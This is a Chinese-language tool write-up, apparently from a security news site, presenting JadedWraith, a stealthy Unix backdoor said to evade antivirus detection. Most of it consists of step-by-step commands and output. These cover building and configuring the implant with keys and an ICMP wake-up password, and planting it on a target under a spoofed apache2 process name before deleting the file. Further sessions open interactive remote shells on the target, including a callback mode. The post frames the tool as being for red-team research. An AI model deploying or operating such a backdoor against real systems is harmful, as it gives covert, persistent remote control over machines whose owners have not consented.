![](https://image.3001.net/images/20211009/1633760274_6161341294f69360af186.jpg!small)

## 关于JadedWraith

JadedWraith是一款功能强大的轻量级Unix后门，仅供研究及教育目的使用。该工具对于红队研究人员和CTF参赛人员非常有用，并且可以在不被反病毒产品检测到的情况下植入目标系统。

## 功能介绍

JadedWraith是一个功能强大的后门，可以监听TCP端口，也可以嗅探数据包中的ICMP数据包，并控制后门返回信息或继续监听。该工具基于类似[
_PRISM_](https://github.com/andreafabrizi/prism)的工具实现其功能，但与PRISM不同的是，JadedWraith使用了加密算法来对控制命令进行了混淆处理。

JadedWraith可以帮助广大研究人员在目标设备上执行远程命令或上传后续的Payload。

JadedWraith可以编译为独立的可执行文件，也可以编译为进程注入的共享对象。

## JadedWraith组件

实际植入的后门源码存在于src目录中。client目录中包含了一个基于Python开发的客户端，主要用于跟JadedWraith进行交互。项目中的conf_jawr脚本可以用于配置新的JadedWraith可执行程序。

## 依赖组件

植入的后门程序需要使用一个现代C代码库和libpthread。具体取决于目标操作系统类型，可能还会需要使用到libpcap。

Python配置脚本和客户端的正常运行则需要使用到termcolor和pycryptodomex。

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/phath0m/JadedWraith.git

## 工具编译

广大研究人员可以直接使用Makefile来编译工具源码。注意：编译完成后的代码将存储在bin目录中，而且必须在使用之前需要进行配置：

    
    
    $ ./configure
    
    $ make
    
    $ ls -lart bin
    
    -rwxrwxr-x. 1 root root 19712 Jul 31 13:08 JadedWraith-2.0.0-Linux-x86_64.elf

## 工具配置

我们可以使用conf_jawr脚本来配置JadedWraith可执行程序。该脚本将搜索bin目录以寻找需要配置的JadedWraith可执行程序。配置后的项目代码将会被写入至configured目录之中：

    
    
    $ ./conf_jawr
    
    JadedWraith Configuration
    
     
    
    Please choose a JadedWraith binary to use:
    
    JadedWraith-2.0.0-Linux-x86_64.elf
    
    Binary : 1
    
    Shared Key [95454c93c8d5d30a0782da72ade10e29] :
    
    Enable passive mode (ICMP wakeup) ? [y/n] y
    
    Wakeup Password [4Zw2TTtaIKBcyeoLwd7rrTasRlUF90vSZnLFzn2A4ab018Vj] :
    
    argv[0] (Leave blank to not spoof command) [] :
    
     
    
    JadedWraith Executable : /tmp/JadedWraith/configured/builds/JadedWraith-2.0.0-Linux-x86_64.1627752415.bin
    
     
    
    Try me!
    
       sudo ./wraith-client.py <IP_ADDRESS> -k 95454c93c8d5d30a0782da72ade10e29 -P 4Zw2TTtaIKBcyeoLwd7rrTasRlUF90vSZnLFzn2A4ab018Vj

## 后门植入

配置好的后门程序可以直接在目标系统上运行。如果配置时使用了被动ICMP功能，则后门程序必须以root权限运行。环境变量_CMD可以用来欺骗进程的“argv[]”参数：

    
    
    # cd /tmp
    
    # nc -lvp 4444 > apache2
    
    # chmod +x apache2
    
    # _CMD="/usr/sbin/apache2" ./apache2
    
    # rm apache2

## 后门交互

项目中client目录内的wraith-client.py脚本可以用于跟JadedWraith交互，我们可以直接使用conf_jawr脚本生成的参数来调用wraith-client.py脚本，将目标IP替换<IP_ADDRESS>。如果使用ICMP功能，则必须以root用户身份运行脚本以发送ICMP数据包。

    
    
    $ ~/JadedWraithFork/client> sudo ./wraith-client.py 192.168.100.224 -k 1deeb4a64440b8d13c84a8eb4e7c4453 -P y00nrnwpwXdvPOXSS6K0r7LelFeCBvKx91Oj0s5BrnLyx1WR
    
    [+] sent ICMP wake up command to 192.168.100.224
    
    [*] backdoor will listen on port 58290
    
    [*] connecting to 192.168.100.224:58290
    
    [+] connection established!
    
    [*] entering interactive shell
    
    >> .cd /tmp
    
    >> w
    
     14:22:49 up  3:02,  1 user,  load average: 0.18, 0.19, 0.23
    
    USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
    
    >> ps -ef
    
    UID          PID    PPID  C STIME TTY          TIME CMD
    
    root           1       0  0 11:20 ?        00:00:01 /usr/lib/systemd/systemd --switched-root --system --deserialize 31
    
    >> .exit
    
    $ sudo ./wraith-client.py 127.0.0.1 --callback 192.168.100.224 -k 1deeb4a64440b8d13c84a8eb4e7c4453 -P y00nrnwpwXdvPOXSS6K0r7LelFeCBvKx91Oj0s5BrnLyx1WR
    
    [+] sent ICMP wake up command to 127.0.0.1
    
    [*] backdoor will connect to port 37943
    
    [*] listening on port 37943
    
    [+] accepted connection!
    
    [*] entering interactive shell
    
    >>

## 项目地址

 **JadedWraith：** 【[ _GitHub传送门_](https://github.com/phath0m/JadedWraith)】

## 参考资料

  * [ _https://github.com/andreafabrizi/prism_](https://github.com/andreafabrizi/prism)

